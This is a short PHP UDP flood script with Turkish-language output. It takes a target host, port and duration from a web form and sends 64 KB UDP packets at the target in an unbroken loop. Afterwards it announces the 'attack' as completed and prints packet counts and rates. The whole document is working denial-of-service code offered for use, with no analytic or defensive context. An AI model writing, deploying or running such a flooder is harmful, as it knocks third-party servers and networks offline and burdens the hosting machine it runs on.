<?php
$packets = 0;
$host = $_POST['host'];
$port = $_POST['port'];
set_time_limit(0);
ignore_user_abort(FALSE);
$exec_time = $_POST['exec_time'];
$time = time();
print "$host hostunun $port portuna <br><br>";
$max_time = $time+$exec_time;
for($i=0;$i<65535;$i++){
    $out .= "X";
}
while(1){
    $packets++;
    if(time() > $max_time){
        break;
    }
$fp = fsockopen("udp://$host", $port, $errno, $errstr, 5);
if($fp){
    fwrite($fp, $out);
    fclose($fp);
  }
}

echo "Saldırı ".time('h:i:s')." itibari ile tamamlandı <br />";
echo "Toplam ".$packets." adet " .round(($packets*65)/1024, 2) . " mB
boyutunda paket gönderildi.<br />";
echo "Saniyede ortalama". round($packets/$exec_time, 2) . "paket
gönderildi.<br />";
?>